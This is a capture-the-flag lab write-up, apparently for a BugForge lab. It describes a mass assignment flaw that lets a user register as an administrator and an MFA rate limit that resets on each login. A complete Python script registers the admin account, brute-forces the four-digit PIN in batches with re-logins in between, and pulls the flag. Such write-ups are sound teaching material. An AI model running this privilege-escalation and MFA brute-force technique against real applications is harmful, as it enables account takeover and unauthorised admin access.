## Summary

This lab contains a mass assignment vulnerability which allows registering an account with the administrator role. After logging in as an administrator user, we need to bypass a rate-limited MFA input to get access to the `/admin` dashboard. The main weakness with the MFA implementation is that the lockout is based on time, and not on a specific number of invalid attempts. Furthermore, logging in again resets the lockout threshold. So we're able to send N number of guesses, followed by a login, followed by N more guesses until the correct PIN is found. 

## The Attack

The following Python script automates the full attack. Just replace the URL with the URL of your lab instance. The following steps are performed:

1. Registers a user with the 'administrator' role
2. Logs in as the administrator user to generate an MFA session
3. Repeats a series of 10 MFA guesses until the correct one is found, followed by login request to reset the lockout threshold. 
4. When a valid MFA code is found, the code is verified and the flag is retrieved from `/api/admin/contents`. 

### Proof-of-Concept Script

```python
import requests
import time
import random
import string
import re

BASE_URL = "https://lab-1771886972282-ycxdxg.labs-app.bugforge.io"
BATCH_SIZE = 10
PAUSE_SECONDS = 1
REQUEST_TIMEOUT = 15

# Shared session for connection reuse
session = requests.Session()
FLAG_PATTERN = re.compile(r"bug\{[^}]+\}")


def random_username(length=8):
    return "admin_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def register_account(username):
    """Register a new administrator account and return the auth token."""
    data = {
        "role": "administrator",
        "username": username,
        "email": f"{username}@test.com",
        "full_name": username,
        "password": "password",
    }
    print(f"\n[*] Registering account: {username}")
    try:
        r = session.post(f"{BASE_URL}/api/register", json=data, timeout=REQUEST_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print(f"    [!] Registration request failed: {e}")
        return None
    print(f"    Status: {r.status_code} — {r.text[:120]}")
    try:
        token = r.json().get("token")
    except Exception:
        print("    [!] Could not parse registration response")
        return None
    if token:
        print(f"    [+] Got token: {token[:30]}...")
    return token


def login(username):
    """Log in with the given username and return the auth token."""
    print(f"\n[*] Logging in as {username}...")
    try:
        r = session.post(
            f"{BASE_URL}/api/login",
            json={"username": username, "password": "password"},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"    [!] Login request failed: {e}")
        return None
    print(f"    Status: {r.status_code}")
    if r.status_code == 200:
        try:
            token = r.json().get("token")
        except Exception:
            print("    [!] Could not parse login response")
            return None
        if token:
            print(f"    [+] Got token: {token[:30]}...")
            session.headers.update({"Authorization": f"Bearer {token}"})
        return token
    else:
        print(f"    [!] Login failed: {r.text[:120]}")
        return None


def send_mfa_guess(code):
    """Send a single MFA verification guess. Returns (success, response_json)."""
    try:
        r = session.post(
            f"{BASE_URL}/api/mfa/verify",
            json={"pin": code},
            timeout=REQUEST_TIMEOUT,
        )
    except requests.exceptions.RequestException as e:
        print(f"    [!] MFA request failed for {code}: {e}")
        return False, {"error": str(e)}
    try:
        body = r.json()
    except Exception:
        body = {"raw": r.text}

    success = r.status_code == 200
    return success, body


def brute_mfa(username):
    """
    Brute-force MFA codes in batches of BATCH_SIZE.
    After each batch: pause PAUSE_SECONDS, re-login, continue.
    On success: print and return (code, jwt_token).
    """
    # Initial login to get pre-MFA token
    token = login(username)
    if not token:
        print("[!] Could not obtain login token. Aborting.")
        return None

    code_num = 0  # start from 0000

    while code_num <= 9999:
        # --- send a batch of 10 guesses ---
        print(f"\n[*] Sending MFA guesses {code_num:04d}–{min(code_num + BATCH_SIZE - 1, 9999):04d} ...")
        for _ in range(BATCH_SIZE):
            if code_num > 9999:
                break
            code = f"{code_num:04d}"
            success, body = send_mfa_guess(code)
            if success:
                bearer_token = session.headers.get("Authorization", "").replace("Bearer ", "")
                print(f"\n[+] SUCCESS!  Code: {code}")
                print(f"    Bearer token used : {bearer_token}")
                return code, bearer_token
            else:
                detail = body.get("message") or body.get("error") or str(body)
                print(f"    {code} — {detail}")
            code_num += 1

        if code_num > 9999:
            break

        # --- pause then re-login ---
        print(f"\n[*] Pausing {PAUSE_SECONDS}s before re-login...")
        time.sleep(PAUSE_SECONDS)

        token = login(username)
        if not token:
            print("[!] Re-login failed. Aborting.")
            return None

    print("\n[!] Exhausted all 10 000 codes without success.")
    return None


def fetch_flag():
    """Check MFA status then fetch admin content and extract the flag."""
    # Step 1: Confirm MFA is verified
    print("\n[*] Checking MFA status via /api/mfa/check...")
    try:
        r = session.get(f"{BASE_URL}/api/mfa/check", timeout=REQUEST_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print(f"    [!] /api/mfa/check request failed: {e}")
        return None
    print(f"    Status: {r.status_code}")
    if r.status_code != 200:
        print(f"    [!] MFA check did not return 200. Body: {r.text[:300]}")
        return None
    print(f"    [+] MFA check passed: {r.text[:120]}")

    # Step 2: Fetch admin content
    print("\n[*] Fetching /api/admin/content...")
    try:
        r = session.get(f"{BASE_URL}/api/admin/content", timeout=REQUEST_TIMEOUT)
    except requests.exceptions.RequestException as e:
        print(f"    [!] /api/admin/content request failed: {e}")
        return None
    print(f"    Status: {r.status_code}")

    match = FLAG_PATTERN.search(r.text)
    if match:
        flag = match.group(0)
        print(f"    [+] Flag found: {flag}")
        return flag
    else:
        print(f"    [!] No flag found in response.")
        return None


def main():
    username = random_username()

    # 1) Register administrator account
    reg_token = register_account(username)
    if not reg_token:
        print("[!] Registration failed. Aborting.")
        return

    # 2) Brute-force MFA
    result = brute_mfa(username)
    if result:
        code, bearer_token = result
        print(f"\n{'='*50}")
        print(f"MFA Code       : {code}")
        print(f"Bearer Token   : {bearer_token}")
        print(f"{'='*50}")

        # 3) Fetch the flag from /admin
        flag = fetch_flag()
        if flag:
            print(f"\n{'='*50}")
            print(f"FLAG: {flag}")
            print(f"{'='*50}")


if __name__ == "__main__":
    main()
```